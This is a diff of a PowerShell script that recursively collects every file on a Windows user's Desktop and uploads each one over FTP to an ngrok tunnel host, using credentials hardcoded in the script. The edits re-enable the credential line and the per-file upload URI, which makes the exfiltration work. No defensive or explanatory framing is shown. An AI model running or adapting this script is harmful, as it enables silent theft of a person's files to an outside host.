@@ -5,10 +5,10 @@ $Dir="C:\Users\User\Desktop"
 $ftp = "ftp://dumdumftp:pVckfaytipNqYhy9uzcG@0.tcp.ngrok.io:10385/" 
 $user = "dumdumftp" 
 $pass = "p#}Vck,fayt?ipNqYhy9uzcG"  
-$uri = New-Object System.Uri($ftp)
+#$uri = New-Object System.Uri($ftp)
 $webclient = New-Object System.Net.WebClient 
  
-#$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
+$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
  
 #list every file 
 $SrcEntries = Get-ChildItem $Dir -Recurse
@@ -16,6 +16,6 @@ $Srcfolders = $SrcEntries | Where-Object{$_.PSIsContainer}
 $SrcFiles = $SrcEntries | Where-Object{!$_.PSIsContainer}
 foreach($item in $SrcFiles){ 
     "Uploading $item..." 
-    #$uri = New-Object System.Uri($ftp+$item.Name) 
+    $uri = New-Object System.Uri($ftp+$item.Name) 
     $webclient.UploadFile($uri, $item.FullName) 
  } 
